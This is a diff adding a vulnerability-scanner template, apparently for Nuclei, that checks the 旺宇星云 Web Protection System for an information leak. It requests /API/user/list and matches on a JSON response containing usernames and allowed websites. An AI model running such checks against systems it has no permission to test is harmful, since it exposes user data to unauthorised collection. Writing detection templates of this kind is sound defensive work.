@@ -1,0 +1,25 @@
+id: poc-yaml-wangyu-xingyun-web-protection-system-information-leakage
+info:
+  name: "旺宇星云 Web Protection System 信息泄露漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 旺宇星云
+http:
+  - method: GET
+    path:
+      - "/API/user/list"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "items"
+          - "username"
+          - "allowed_web_site"
+      - type: word
+        part: header
+        words:
+          - "application/json"
